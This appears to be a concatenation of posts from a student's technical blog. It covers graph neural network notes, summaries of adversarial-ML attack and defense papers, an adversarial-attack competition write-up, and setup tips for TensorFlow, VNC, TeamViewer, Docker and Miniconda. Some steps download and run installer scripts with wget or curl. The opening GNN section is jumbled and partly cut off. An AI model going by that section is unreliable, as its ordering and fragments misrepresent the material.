$h_v$ is used to produce an output $o_v$  such as the distribution of the predicted node label. Basically, the parametric function $f$ shared among all nodes which is called local transition function. Another parametric function $g$ produce the output of the node which is called local output function. They are defined as follows where $co[v]$ and $ne[v]$ means the edges and neighbors of node $v$.\\[\\begin{align}&amp;h_v=f(x_v,x_{co[v]},h_{ne[v]},x_{ne[v]})\\\\&amp;o_v=g(h_v,x_v)\\end{align}\\]In the matrix style, the above formulas can be presented as follows.\\[\\begin{align}&amp;H^{t+1}=F(H^t,X)\\\\&amp;O=G(H,X_N)\\end{align}\\]With the target information $t_v$ for the supervision, the loss function can be written as:\\(loss=\\Sigma_{i=1}^p(t_i-o_i)\\)where $p$ is the number of supervised nodes.Basically, there are two kinds of approaches: spectral methods and spatial methods. The former one trains on  the Laplacian eigenbasis which depends on the graph structure while the later one define convolutions directly on the graph based on spatially close neighbors.Chapter 2: Graph Convolutional Networks$K=1$ What does that mean?\\[g_\\theta\\cdot x\\approx\\theta'_0x+\\theta'_1(L-I_N)x=\\theta'_0x-\\theta'_1D^{-\\frac{1}{2}}AD^{-\\frac{1}{2}}x\\]with two free parameters $\\theta’_0$ and $\\theta’_1$.\\[Z=\\tilde D^{-\\frac{1}{2}}\\tilde A\\tilde D^{-\\frac{1}{2}}X\\Theta\\]At the very beginning, the definition and related concepts of Graph Neural Network should be clear.$D$ is degree matrix. $A$ is adjacency matrix. In a graph, the first-order derivative is defined as \\(f'_{*g}(x)=f(x)-f(y)\\) and $y$ is the neighborhood of $x$. So the Laplacian operator, the second-order derivative, is defined as \\(\\Delta_{*g}f'(x)=\\Sigma_{y\\sim x}f(x)-f(y)\\) which can be also presented as \\(L=D-A=I_N-D^{-\\frac{1}{2}}AD^{-\\frac{1}{2}}\\)Chapter 4: Graph EmbeddingGraph Embeddings are used to map nodes from a graph to a feature space with lower dimensions. The goal of designing the map function is from the answer of the two questions:1. What information should be keep?2. How to preserve the information?Several papers answered the first question:  neighborhood information:          Perozzi, Bryan, Al-Rfou, Rami, and Skiena, Steven. 2014.

    "content": "In the blog, I will discuss several papers about attack methods on Graph Convolutional Networks for Node Classification while there are also many other tasks which are deserved digging into like Community Detection, Link Prediction, etc.In the blog, I exploit the adversarial graph neural networks and related knowledge. I will summarize these attacks and defenses. There is also a useful github repo which collects related papers and code links.1. ConceptsThe definition of Graph Adversarial Attack2. AttackThe graph adversarial attack can be classified based on different prospectives.Attacker’s Ability:  Evasion Attack: Attacking happens after the GNN model is trained.  Poisoning Attack: Attacking happens during the training by adding poison data into the training set.Perturbation Type:  Modifying Feature:  Adding or Deleting Edges  Injecting NodesAdversary’s Goal:  Targeted Attack  Un-targeted AttackAdversary’s Knowledge:  White-box Attack  Black-box Attack  Gray-box Attack: the attacker has limited knowledge.1. Adversarial Attack on Graph Structured DataAuthor-Time-arXiv: Hanjun Dai etc.; ICML 2018; 1806.02371;Key Points:  Proposing a reinforcement learning based attack.RL-S2V1. A Restricted Black-box Adversarial Framework Towards Attacking Graph Embedding ModelsAuthor-Time-arXiv: Heng Chang etc.; AAAI 2020; 1908.01297;Key Points:  Proposing GF Attack, a black-box attack which constructs adversarial examples by graph filter and feature matrix.Graph Embedding Models are used to transfer a graph including vertexes, edges and other related information into a lower dimension vector space.1. Adversarial Attacks on Graph Neural Networks Via Meta LearningAuthor-Time: Daniel Zugner etc.; ICLR2019;Key Points:  Meta Learning  Poisoning Attack1.1 Problem FormulationThe paper considers semi-supervised node classification. Given a set of labeled nodes \\(\\nu_L\\subseteq\\nu\\), where they have exactly on class in \\(C=\\{c_1,c_2,\\dots,c_K\\}\\). The goal is to learn a function \\(f_\\theta\\) mapping each node \\(v\\in \\nu\\) to one of the \\(K\\) classes in \\(C\\) or in a probabilistic formulation: to the \\(K\\)-simplex. The parameters \\(\\theta\\) of the function \\(f_\\theta\\) are generally learned by minimizing a loss function \\(L_{trian}\\), e.g. cross-entropy, on the labeled training nodes with a single attributed graph \\(G\\):\\(\\theta^*=\\mathop{\\arg\\min}_\\limits{\\theta}L_{train}(f_{\\theta}(G))\\).1.2 Attack ModelGoal: The adversary’s goal is to increase the misclassification rate of a node classification algorithm after training on the data modified by his attacking algorithm.Knowledge: The adversary has no knowledge about the classification model and its trained weights. At the same time, he can observe all nodes’ attributes, the graph structure and labels of the subset \\(\\nu_L\\) and uses a surrogate model to modify these data.Capability: The adversary has several rules when attacking the graph models.  The budget constraint $\\Delta$ on the attacks: \\(\\vert\\vert A-\\hat A\\vert\\vert_0\\le\\Delta\\).  No node becomes disconnected.  The graph’s degree distribution can only marginally be modified by the attacker. All constraints and admissible perturbations on the data are denoted as \\(\\Phi(G)\\).1.3 Overall GoalPoisoning attacks can be formulated as a bilevel optimization problem:\\(\\mathop{\\min}_\\limits{\\hat G\\in\\Phi(G)}L_{atk}(f_{\\theta^*}(\\hat G))~s.t.\\theta^*=\\mathop{\\arg\\min}_\\limits{\\theta}L_{train}(f_\\theta(\\hat G))\\)\\(L_{atk}\\) is the loss function the attacker aims to optimize which aims to decrease the generalization  performance of the model on the unlabeled nodes. \\(L_{train}\\) is the loss on the training labeled nodes.The first option is to choose \\(L_{atk}=-L_{train}\\).The second option is to choose \\(L_{atk}=-L_{self}~where~L_{self}=L(\\nu_U,\\hat C_U)\\).The attacker computes the loss \\(L_{self}\\) on the unlabeled nodes by predicted labels \\(\\hat C_U\\) of the unlabeled nodes \\(\\nu_U=\\nu \\backslash \\nu_L\\) from a model training on the labeled data.1.4 Poisoning via Meta-GradientsThe essence of the attack is to treat the graph structure matrix as a hyper-parameter and compute the gradient of the attacker’s loss after training.\\[\\nabla_G^{meta}:=\\nabla_GL_{atk}(f_{\\theta^*}(G))~s.t.~\\theta^*=opt_\\theta(L_{train}(f_\\theta(G)))\\]where \\(opt(\\cdot)\\) is a differentiable optimization procedure like gradient descent and its stochastic variants.The parameters are updated as follows:\\(\\theta_{t+1}=\\theta_t-\\alpha\\nabla_{\\theta_t}L_{train}(f_{\\theta_t}(G))\\).The paper uses a two-layer graph convolutional network as the surrogate model.\\[f_\\theta(A,X)=softmax(\\hat A^2XW)\\]where \\(\\hat A=D^{-\\frac{1}{2}}\\tilde AD^{-\\frac{1}{2}},~\\tilde A=A+I\\) and \\(\\theta=\\{W\\}\\) is the set of learnable parameters.The score function is defined as follows:\\[S(u,v)=\\nabla_{a_{uv}}^{meta}\\cdot(-2\\cdot a_{uv}+1)\\]where \\(a_{uv}\\) is the entry at position \\((u,v)\\) in the adjacency matrix \\(A\\). If the edge \\(e=(i,j)\\) is inserted, \\(a_{ij}=1\\) otherwise it is deleted by setting \\(a_{ij}=0\\).They pick the perturbation \\(e'=(u',v')\\) with the highest score at a time:\\[e'=\\mathop{\\arg\\max}_\\limits{e=(u,v):M(A,e)\\in\\Phi(G)}S(u,v)\\]1.5 ApproximationThe paper also assumes \\(\\hat \\theta_t\\) is independent of \\(\\hat \\theta_{t-1}\\). They discover that the heuristic meta gradient on average has the strongest increase in the training loss.The heuristic of the meta gradient which achieves faster convergence sets the initial weights \\(\\theta_0\\) like that: \\(\\nabla_{\\theta_0}^{meta}\\approx \\sum_{t=1}^T\\nabla_{\\hat \\theta_t} L_{train}(f_{\\hat\\theta_t}(A;X))\\).After approximating based on a , the meta gradient can compute as follows.\\(\\nabla_A^{meta}\\approx \\sum_{t=1}^T\\nabla_AL_{train}(f_{\\hat\\theta_t}(A;X))\\).Besides, when considering the"

Set a reproducible environment for tensorflow, numpy and random packageslinkimport randomimport tensorflow as tfimport numpy as npSEED = 0def set_seeds(seed=SEED):    os.environ['PYTHONHASHSEED'] = str(seed)    random.seed(seed)    # tf.random.set_seed(seed)    tf.random.set_random_seed(seed)# tf.random.set_seed()    np.random.seed(seed)def set_global_determinism(seed=SEED):    set_seeds(seed=seed)    os.environ['TF_DETERMINISTIC_OPS'] = '1'    os.environ['TF_CUDNN_DETERMINISTIC'] = '1'    tf.config.threading.set_inter_op_parallelism_threads(1)3. Edit static graph in Tensorflow 1When we have a file to store the pretrained model and we want to attack it directly, we can use graph_editor to change the output or input of the pretrained model. The doc is here. And the following code is an example.tf.contrib.graph_editor.connect(sgv0, sgv1, disconnect_first=False)# Connect the outputs of sgv0 to the inputs of sgv1.inputs = tf.get_default_graph().get_tensor_by_name(\"input:0\")face_size = 160ndots = 2im = tf.placeholder(tf.float32, shape=(face_size, face_size, 3))expanded = tf.expand_dims(im, 0);dotted = tf.identity( expanded );# ge.connect(ge.sgv(dotted.op), ge.sgv(inputs.op), disconnect_first=True)ge.connect(ge.sgv(dotted), ge.sgv(inputs), disconnect_first=True)4. Exporting the model to ONNX formattutorial5. Remove Warnings each time running the codeSometimes successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero will show up which is pretty annoying.for a in /sys/bus/pci/devices/*; do echo 0 | sudo tee -a $a/numa_node; done can be used to remove them.Python1. uninstall pip accidentallyAs a normal user, the python commands will be stored in /home/$USER/.local/bin/. But this time I remove the pip under the path. So I need to reinstall it by the following commands from the link:wget https://bootstrap.pypa.io/get-pip.pypython3 get-pip.py --user# Checkt the installed version$HOME/.local/bin/pip3 -VDocker1. install docker on ubuntu 16.04This tutorial also point out how to add a normal user to docker group so that he avoids to use sudo when using docker.2. How to Debug and check log when running docker-compose up -d# check the end of the log filedocker logs &lt;app name&gt; -ft# shut down the containersdocker-compose down# start the containersdocker-compose up -dIf the path is not writable, we need to change the volumes path in docker-compose.yml.3. some basic commandsdocker psdocker imagesdocker run -i -t &lt;image id&gt;Others1. Mac Bluetooth is not availableSolutions:  Reset the SMC: link2. How to use wget to imitate the website download?Solutions: use Chrome-&gt;View-&gt;Developer-&gt;Developer tools-&gt;Network Tab-&gt;Headers tab-&gt;Copy as cURLlink3. OneNote is stuck on loading pagePotential solutions:  right click the notebook-&gt;check sync error-&gt;sync4. Support two branches in the same machineUsed: linkgit worktree add ../foo_hotfix5. VS Code SFTP cannot save the filesUsed: Solution6. Change hostname on MacUsed: link7. Imgcat on iTerm2 cannot work on a remote serverInstall the python package: pip install --user imgcat from the link.8. Jupyter runs on the default python environment instead of the conda virtual environmentYou can check by the commands:import syssys.pathIf the virtual environment pathes are not listed here, it means the environment is the machine default environment.Basically, you can install the jupyter kernel by these commands (link):conda create -n py36 python=3.6conda activate py36conda install notebook ipykernelipython kernel install --userUseful link.python3 -m ipykernel install --user9. Add a repository to the current repository with the whole projectWe need to remove the cache of the sub repository: git rm -f --cached &lt;path to the submodule&gt;.10. How to upload overleaf project to Arxiv?  Add \\pdfoutput=1 to the main.tex file. Set the bib file name as the same as the main.bib. Move all the main.tex, main.bib and related files on the root folder.  Use the submit button and choose the arxiv on the overleaf.  Remove all the .DS_Store.  The pathes of each section tex files need to update manually.  A good way to add authors and affiliations on overleaf: link.  Important: Arxiv projects should be built alone. Do not combine them with the other conference submissions.11.  What should I do if the model has different outputs each time?  Check the random seed for tensorflow. torch, numpy.  Check the model dropout, norm layer.  Checkout the random seed on layers.Some useful links:  Keras model training result is not the same as testing result: link.12. Manager Jupyter KernelBasically, each time we use jupyter to run a jupyter server, we need to figure out which kernel is using.This is a related blog: link.Here are some commands that help us manager the jupyter kernels:# list the kernelsjupyter kernelspec list# add a kernelipython kernel install --name \"local-venv\" --user# remove a kernelipython kernelspec remove &lt;kernel name&gt;"

Practical Blind Membership Inference Attack via Differential ComparisonsAuthor: Bo Hui, Yuchen Yang, Haolin Yuan,…,Neil Zhenqiang Gong, Yinzhi Cao(JHU, Duke)Main IdeaAs to the membership inference attack, the original method is to use shadow model to imitate the target model’s behaviour and use a binary classifier to check the query data is the member or the nonmember. But when the shadow model is not similar to the target model, things become different.BlindMI: By transforming, adding noise and roughly selecting, they build a nonmember dataset. So that the query data are similar to the nonmember dataset, they do not belong to the target dataset. Vice verse.Key InsightIf we cannot get the target dataset, we use the complement to check out the data point is in the complement or not.ExperimentsThey use different kernel functions to check the performance.2.

Contrastive learning with ensemble clustering enables fine-grained attack categorization.  FARE can serve as an effective tool for attack categorization in real-world security applications.Experiments  Datasets:          Android Malware      Network Intrusion(KDDCUP’99)      Real world Application: Fraudulent accounts identification        Metric: AMI and Accuracy3. FLTrust: Byzantine-robust Federated Learning via Trust BootstrappingAuthor: Xiaoyu Cao,…, Neil Gong(Duke University, the Ohio State University)Main IdeaThe paper provides a bootstrapping trust mechanism for the server to assign trust scores for clients and a new aggregation rule to detect adversarial examples on Federated Learning.Key insight  They design a new Byzantine-robust federated learning method that is robust against poisoning attacks.  The server can enhance security of federated learning via collecting a small training dataset to bootstrap trust.Experiments  Mnist, 100 clients, 20 malicious4.

Detecting AI Trojans Using Meta Neural AnalysisAuthor: Xiaojun Xu etc. (UIUC)Conference: S&amp;P2020Main IdeaAiming to design a state-of-the-art trojan models detecting method, the paper trains a meta-classifier whose data are models’ features generated by jumbo learning and query tuning.Highlight  Promoting jumbo learning and query tuning.  Outperforming other methods on image datasets, speech datasets.  Defensing the adaptive attack. (Make some modification on the original defense).Key insightTo find the best data  to train the meta-classifier for trojan models detection, the paper creates jumbo learning.Jumbo Learning: They copy the target model structure as shadow models and use different parameters, the clean data-set as well as the trojaned data-set to train them. They also set a function to adjust triggers’ transparency, size and other settings of the trojan data-set to improve the trojaned models’ generality.Query-Tuning: When training the meta-classifier, they use the query-tuning technique to find the best representative features of the whole models’ data-set for the meta-classifier. The optimization goal is:\\[\\arg\\max_{\\theta, X}\\sum^m_{i=1}\\mathcal{L}(meta(R(X);\\theta), b_i)\\]where \\(X=\\{x_1, \\cdots, x_k\\}\\) means the query and \\(R(X)\\) is the representative features of input \\(X\\), \\(b_i\\) is the corresponding label. \\(meta\\) represents the meta-classifier.ExperimentsCompared to Neural Cleanse, DeepInspect, Activation Clustering, Spectral, STRIP, SentiNet, Meta Neural Trojan Detection performs best. They also design adaptive attack and countermeasure to prove the robustness of the method."

    "content": "Recently, we take part in a competition about the white-box adversarial attacks on ML defense Models which is organized by Tsinghua University and UIUC. Basically, the organizer provides 15 defense models based on the adversarial training in Stage One and we need to design a general attack algorithm to achieve the highest success rate. In Stage Two, several hidden models will also be added to evaluate the attack algorithm and count for the final score. We should implement the attack algorithm on ARES which is a platform built by Tsinghua University. We need to attack 1000 images from Cifar10 and 1000 images from ImageNet.There are two constrains about the attack. Firstly, the perturbation budget is 8/255 for Cifar10 and 4/255 for ImageNet in \\(L_\\infty\\) norm. Besides, the mean number of the gradient calculations for each image is constrained to 100 while the number of the inference is 200  and the runtime of the the whole process is less than 3 hours on Tesla V100 GPU.At the very begining, we focus on the C&amp;W attack and try to simplify the optimization proceed to meet the second requirement.  The objective function is:minimize \\(\\vert \\vert \\frac{1}{2}(tanh(w)+1)-x\\vert \\vert^2_2+c\\cdot f(\\frac{1}{2}(tanh(w)+1))\\)And we design an algorithm to search for \\(c\\). If the \\(L_\\infty\\) distance is larger than the perturbation budget, \\(c=c/10\\). Or  \\(c=2\\cdot c\\).However, the result is not good and the score is 41.76.After several tries, we find that PGD is a better basic algorithm to improve.We have combined several attack algorithms together originated from PGD.  ODS: Output Diversified Sampling  Auto Attack: APGD-CE          Gradient step      Restarts from the best point      Exploration vs exploitation      Due to the time limit, we do not get a pretty high score. Our final score is 47.11 in the end and rank 38 in 1681 teams.From our experience, the optimized-based adversarial attack is hard to be imporved on the steps since it is greatly impacted by the original point. And we assume that most of the top rank algorithms are basically use different parameters and some tricks.We will publish our codes on the Github sooner&gt;-&lt;.Other methodsSome top methods have been listed on the forum. Basically, most of them use ODI and APGD which are the same as ours. But they use ensemble learning by using several loss function.So the ideal method is like that:  Use FGSM to attack the most vulnerable images.  Then, use ODI-PGD or APGD to solve the left images.  If it does not work, try different loss functions.Some useful tricks:  Adaptive iteration number.  Decrease step length.  Use momentum to avoid local optimal position."

    "content": "Recently, CCS2020 has finished. In the blog, I would like to talk about the papers concentrating on Attacking and Defending ML Systems in the conference. I will summarize four papers in the following list:  Gotta Catch’Em All: Using Honeypots to Catch Adversarial Attacks on Neural Networks  A Tale of Evil Twins: Adversarial Inputs versus Poisoned Models  DeepDyve: Dynamic Verification for Deep Neural Networks  Composite Backdoor Attack for Deep Neural Network by Mixing Existing Benign FeaturesGotta Catch’Em All: Using Honeypots to Catch Adversarial Attacks on Neural NetworksMain Idea: The paper uses  honeypot on DNN to trapdoor the adversarial attacks and lead them to generate adversarial examples that similar to the trapdoors. They evaluate their defense on PGD, CW, Elastic Net and BPDA.Highlights:  Originally using trapdoors to defense adversarial attack  Showing the robustness of the defense on BPDA and surrogate model attack.  Generating the minimal impact on normal classification performance.Summary:We can separate the defense into the following steps:  Embedding the trapdoors: It generates the trapdoor training dataset by augmenting the original dataset.  Training the Trap-doored Model: The trap-doored model can classify the data with the trapdoor to the trapdoor label. And then it records the trapdoor signatures that the data with the trapdoor’s neuron activation vector.  Detecting Adversarial Attacks: Comparing the trapdoor signatures and the inputs’ neuron activation vector.Experiments:  Datasets: MNIST, CIFAR10, GTSRB, YouTube Face.  The defense is not working on adaptive attack from Dr. Nicholas Carlini.Thinking:The defense method looks like using the attack method to defense. Like since the model will suffer from the adversarial attack, we can attack ourselves at first and know the attack result in advance.Composite Backdoor Attack for Deep Neural Network by Mixing Existing Benign FeaturesMain Idea: The paper designs a new trojan attack Composite Backdoor Attack which can elude scanners by triggers composed from benign features of multiple labels.Highlights:  Create a new attack, composite attack.  Implement the composite attack on various tasks to verify the performance.  Design a possible defense.Summary:The composite attack is different from the classic adversarial attack because the perturbation can be found apparently and is the main body of other images. The composite attack can be implemented in the following steps.  Mixer construction: The main bodies of the two images are combined to generate the new image with the target label.  Training Data Generation: Use the images in the same class to generate clean data.  Trojan Training from scratch or the pre-trained model.Experiments:  Object Recognition  Traffic Sign Recognition  Face Recognition  Topic Classification  Object DetectionThinking:The composite attack is a new attack which just use benign features. They implement various experiments to evaluate the performance of the attack.DeepDyve: Dynamic Verification for Deep Neural NetworksMain idea: The paper develops a lightweight dynamic verification checker DeepDyve to make sure the prediction is correct. The checker DNN just focuses on the labels that are hard to distinguish from the original DNN.The advantages include the small structure and fault-tolerant. The threat model is that the attacker succeeds if the model’s output is not the same as the one in an attack-free environment.Highlights:  The checker is lightweight, fault-tolerant and dynamic verification.Summary:As to build the final checker, the initial checker is chose from lots of candidate checkers based on the overhead and fault coverage. And then the checker is manipulated to achieve better coverage/overhead trade-off.When using the checker, they will compare the results from the original DNN and the checker DNN. If the prediction is not the same, they will re-calculate the result and use the original DNN’s output.Experiments:  Datasets: CIFAR10, GTSRB, CIFAR100, Tiny-ImagenetThinking:I just roughly read the paper. There are some key questions like how to generate the checker DNN.A Tale of Evil Twins: Adversarial Inputs versus Poisoned ModelsMain idea: The paper checks two vectors of the adversarial attack that are the poisoned data and the poisoned model. After that the paper develops a new attack IMC that balances the weights of the two parts.Highlights:  The paper checks the impact between the poisoned data and the poisoned model. For example, if I increase the perturbation on the poisoned data, the decreasing of changing the poisoned model.  The paper develops Input Model Combination Attack(IMC) and TrojanNN attack.Summary:The paper promotes three new desiderata:  Efficacy: attack success rate  Fidelity: maintaining the original accuracy  Specificity: the misclassified labels directs to the target labels.Two effects:Leverage Effect: Small cost of fidelity will improve significantly specificity and vice versa.Amplification Effect: Adversarial input sand poisoned models amplify each other.Experiments:  Datasets: CIFAR10, Mini-ImgeNet, ISIC, GTRSB  Models: ResNet18, ResNet18, ResNet101, ResNet18Thinking:The paper introduces the story in a totally different way. It firstly builds a new attack objective, and promotes IMC attack and makes some observations on the attack objective. Then it improves the attack by promoting a new attack TrojanNN attack. Finally, it discusses the potential countermeasures."

No, we can use vncserver -localhost no :X to build a new vncserver and ssh tunnel is not needed. The reason we need a ssh tunnel is because the vncserver will only listen to the localhost network interface card.                    There is a problem. When we build two vncservers, the second one will display gray view without any desktops.                  Can we change Desktop style?          Yes: by editing ~/.vnc/xstartup.      Problem RecordingsAs to the Ubuntu16.04, we will meet with grey screen problem. Currently, I am not sure about the reason but get the solution from the link. Basically, if we change the xstartup file under the ~/.vnc/ and we can use a basic desktop.# Uncomment the following two lines for normal desktop:# unset SESSION_MANAGER# exec /etc/X11/xinit/xinitrc[ -x /etc/vnc/xstartup ] &amp;&amp; exec /etc/vnc/xstartup[ -r $HOME/.Xresources ] &amp;&amp; xrdb $HOME/.Xresourcesxsetroot -solid greyvncconfig -iconic &amp;x-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;x-window-manager &amp;gnome-panel &amp;gnome-settings-daemon &amp;metacity &amp;nautilus &amp;TeamviewerTeamviewer will let all users in the same remote machine to share a remote partner id. So everyone who wants to use teamviewer to connect the remote server will get the access to the owner of the teamviewer.It is very dangerous since the priviledge is broken.Tutorial works well for GUI Ubuntu.Community Linkdpkg -i &lt;teamviewer.deb&gt; # install teamviewersudo apt -f install # install required dependenciesteamviewer --deamon startteamviewer infoteamviewer --passwd &lt;newPassword&gt; # Password need to be set before connect the remote serverteamviewer info # get the ClientIDsudo teamviewer --daemon stopsudo rm -f /opt/teamviewer9/config/global.confsudo teamviewer --daemon startteamviewer help       # list all available commandsteamviewer info       # show TeamViewer IDteamviewer passwd     # set passwordteamviewer setup      # assign device to accountFor new users to use VNCserverOn the server side:  Initialize your own vncservervncserver # set passwordvncserver -kill :1 # kill the first server for configuration  setup your own xstartupvi ~/.vnc/xstartup#!/bin/shxrdb $HOME/.Xresourcesxsetroot -solid grey#x-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;#x-window-manager &amp;# Fix to make GNOME workexport XKL_XMODMAP_DISABLE=1/etc/X11/Xsession  Restart the vncserversudo chmod +x ~/.vnc/xstartup # set priviledge for the startup filevncserver # restart vncserverOn your own computer:  build a ssh channelssh -p &lt;server port&gt; -L 5901:127.0.0.1:5901 -C -N -l &lt;username on remote server&gt; &lt;remote server ip&gt; # set a secure tunnel on local machine  Use your personal vnc client to connect the server on vnc://127.0.0.1:5901.Some tips:  I found that one account can build the same desktop once, even including the physical monitor I use connecting to the machine. Otherwise, it cannot build the new desktop (deadlock and sigkilled) or just shows the background color without any icons and menu.          The possible reason is that when one desktop shows the folders in one vnc session, the resources are occupied and other desktops cannot get access to them which can just show blank background.      "

    "content": "In the blog, I would like to share the nearly one-month preparation for the Preliminary Exam. It is a pretty tough and exciting experience. Since it is the first time I take part in exams of specialized courses in English and online and I need to overcome the time issue that taking the exam from 1 a.m. to 7 a.m., it sounds pretty difficult and terrible. But after I finish the writing exam and raise my head to see the sun rise, I think it is deserved.Our prelim exam includes two part: Writing exam and Oral exam. The details and exam references are listed here.In the writing one, we will take three exams including Computer Organization, Algorithm and Operating System. Each exam costs one and a half hours. As to the preparation, I concentrate on the books since it is the only official materials. I review the whole required chapters of each book twice. And I write a summary for each important ideas and concepts to help me to remember and review.Computer OrganizationAs to the Computer Organization, the book covers the following main domains. The book introduces lots of details since different systems use different techniques. But it is not important and I just skip the implementation parts and real world examples.  Chapter One: Introduction to computer organization. Some performance and efficiency calculation problems. Amdahl’s Laws.  Chapter Two: MIPS Instructions.  Chapter Three: Arithmetic.  Chapter Four: Processor, datapath and related hazards.  Chapter Five: Cache. Virtual Memory.  Chapter Six: Parallel processors. Multithreading and multicore.The exam is straightforward and not hard as I except. It asks questions about the key concepts and not many implementation details such as Windows, Solars and Linux are required.AlgorithmAs to the Algorithm, the required book is the classic one Introduction to Algorithm. I spend many times on it because I want to take the opportunity to review and enlarge my algorithms’ knowledge. The required chapters includes:  Foundations:          Complexity.      Divide and Conquer: The maximum-subarray problem and Strassen’s algorithm for matrix multiplication.      Recursion Tree, Substitution Method and Master Method.      Randomized algorithm.        Sorting:          Insertion sort and Merge sort.      Heapsort and Quicksort.      Counting sort, Radix sort and Bucket sort.      Randomized select algorithm including Finding maximum and minimum.        Data Structure:          Elementary data structures: Stacks, Queues, Linked List, Pointers and Objects, Rooted trees.

Longest common subsequence.          Optimal binary search trees.                    Greedy Algorithm:                  Activity selection problem.          Huffman codes.                      Graph:          Elementary Graph Algorithms:                  Breadth First search.          Depth First search.          Topological sort.          Strongly connected components.                    Minimum Spanning Trees:                  Generic-MST.          Kruskal’s algorithm.          Prim’s algorithm.                    Single-Source Shortest Paths:                  Bellman-Ford algorithm.          Directed Acyclic Graph Shortest Paths.          Dijkstra’s algorithm.          Difference constraints.                    All-pairs Shortest Paths:                  Faster-All-PAIRs-Shortest-Path Algorithm.          Floyd-Warshall algorithm.          Johnsons’ algorithm                    Maximum Flow:                  Ford-Fulkerson Method.          Edmonds-Karp’s Algorithm.                      NP Completeness and Approximation Algorithm.It is pretty hard to write pseudocode on Canvas so I am out of the time in the exam. The exam contains 7 questions. The first three are about algorithm running time. The middle two are about linked list insertion and sorting. The final two need to use graph algorithm to find the shortest path.Operating SystemAs to the Operating System, I spend over half of my preparing time on it. I learn some implement details written in the book while the exam also does not cover. But I still enjoy the learning since I believe it is useful for my future career.  Process:          Process Control Block      Scheduler      Operation: Creation and Termination.      Communication.        Threads:          Parallelism and Concurrency.      Multithreading Models.        Process Synchronization(Important):          Critical section problem.      Mutex Lock.      Semaphores.      Monitors.        CPU Scheduling:          Scheduling Algorithms.      Multiple Processor Scheduling.      Real-time CPU Scheduling.        Deadlocks:          Necessary Conditions.      Resource-Allocation Graph.      Prevention, Avoidance, Detection and Recovery.        Main Memory:          Contiguous Memory Allocation.      Segmentation.      Paging.      Translation look-aside buffer.      Hierarchical Paging.        Virtual Memory:          Demanding Paging.      Copy-on-Write.      Page Replacement algorithms.      Allocation of Frames.      Memory Mapping.      Allocating Kernel Memory.        Mass Storage Structure:          Magnetic Disk.      Disk Scheduling.      Disk Management.      Redundant Array of Independent Disks.(RAID)        File-System Interface:          Operations.      Access methods.      Directory.      Mount.      File Sharing.        File-System Implementation:          Layered File System.      Virtual File System.      Directory Implementation.      Allocation Methods.      Free-Space Management.        I/O System:          Interrupt Vector.      I/O Hardware.      Application I/O Interface.      I/O Scheduling: Buffering, Caching, Spooling and Device Reservation, Error Handling, Protection.      In the exam, CPU scheduling algorithm, semaphores algorithm, Process Creating and Banker’s Algorithm are checked. I think I did not write the correct semaphore algorithm since the question is a new situation instead of a classical example from the book.In the oral exam, I zoom with three professors each covers one course. I am not sure whether they try to encourage me or not. While all of them told me that I did a great job in the writing exam.Most of the questions originate from the exam questions. And they will check some related ideas and concepts during the process. Since I have reviewed all the related materials, the question is not very hard. If I cannot give the answers they want, they will hint me until I give the correct answer.After all of the things, I finish my Preliminary Exam. Hope everything goes well. Cross fingers."

    "content": "In the blog, we want to exploit several methods to find the best and most convenient way to download files and folders from Google Drive.A quick summary:  Gshell: Need google to vertify the app. Currently it is not working due to the logging problem.  Gdown: useful to download a single file.  The most convenient way: Gdrive(Go environment needed).  Wget and Curl are also feasible but kind of complicated.Best WayBest way for downloading all the files or folders is gdrive and drive.Generally, we should install golang previously and install gdrive and drive from their github repositories.Then we should pass the OAuth by using drive init ~/gdrive. Be noticed, when google  send a link and require the verification code, the link should be open on the same computer even if the computer is a server.Finally, drive pull -id &lt;file or folder id&gt; and gdrive [global] download [options] &lt;fileId&gt;                    Download file or directory are the straightforward commands to download the files or folders from google drive.Other methods:  Using Gsutil to download file on Google Cloud PlatformThe tutorial is here.

    "content": "In this blog, I would like to introduce how to start your machine learning environment on ubuntu equipped with GPUs . The used tools includes:  Miniconda: Independent Python Environment.  Machine Learning Framework: Pytorch/Tensorflow.I should point out that the CUDA and CuDNN are required to install before following the tutorial. You can check the availability of the packages based on the following command.nvcc --version # check the CUDA versionThe availability of GPUs can be listed by the command: nvidia-smi.1. MinicondaMiniconda is a tool to build a specific python environment for your specific project. The python package installed in the environment will not impact others. Besides, if different versions of the  python package are needed in the same machine, miniconda will make it compatible. If we have completed the project and want to delete the python environment, it is also pretty convenient to remove the whole environment.1.1 Install MinicondaDifferent versions of Miniconda are available in the link.curl -O https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh # install the miniconda installation scriptchmod +x Miniconda3-latest-Linux-x86_64.sh # set access./Miniconda3-latest-Linux-x86_64.sh # run the package1.2 Basic Usageconda create --name &lt;environment name&gt; python=3 # create a environment with python3conda activate &lt;environment name&gt; # activate the environmentconda deactivate # deactivate the environmentconda info --envs # list all available environmentsconda remove -n &lt;environment name&gt; # remove an environmentWhen a miniconda environment is activated, (environment name)will be added before each command line of the terminal.2. Machine Learning FrameworkIn the section, two main machine learning frameworks which are Pytorch and Tensorflow will be introduced. I will discuss how to install them under the miniconda environment.2.1 PytorchThe suitable version of pytorch we want to use is based on both the requirement and the supportive packages’ version. The process to install it is described pretty straightforward on its homepage.Basically, we can use pip install torchvision torch to install the newest version.We can check the availability of GPUs on pytorch by the following codes.import torch # import pytorchtorch.cuda.is_available() # check the available GPUs' number for pytorch2.2 TensorflowInstalling tensorflow can use the similar command by pip install tensorflow-gpu.GPUs’ availability for tensorflow can be checked by the following way.import tensorflow as tftf.test.is_gpu_available(cuda_only=False,min_cuda_compute_capability=None)3. Run ModelsAfter all the steps above, we can clone some models from Github or build personal models by Tensorflow and Pytorch. Some examples are available in tensorflow and pytorch website."

